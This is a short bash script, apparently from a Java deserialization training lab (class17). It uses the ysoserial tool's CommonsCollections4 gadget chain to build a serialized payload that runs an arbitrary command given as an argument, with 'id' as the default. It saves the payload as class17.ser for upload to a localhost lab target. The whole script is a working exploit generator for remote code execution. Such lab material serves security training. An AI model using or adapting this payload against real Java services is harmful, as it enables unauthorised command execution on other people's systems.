#!/bin/bash
# class17 — CC4链 (CommonsCollections4)
# 靶场: /class17/upload
cd "$(dirname "$0")"
CMD="${1:-id}"
JAVA_TOOL_OPTIONS="--add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED
  --add-exports java.base/java.util=ALL-UNNAMED" \
java -jar ../../lib/ysoserial.jar CommonsCollections4 "$CMD" > ../../class17.ser 2>&1
echo "✅ 已生成: class17.ser (命令: $CMD)"
echo "🎯 上传到 http://localhost:81/class17/"
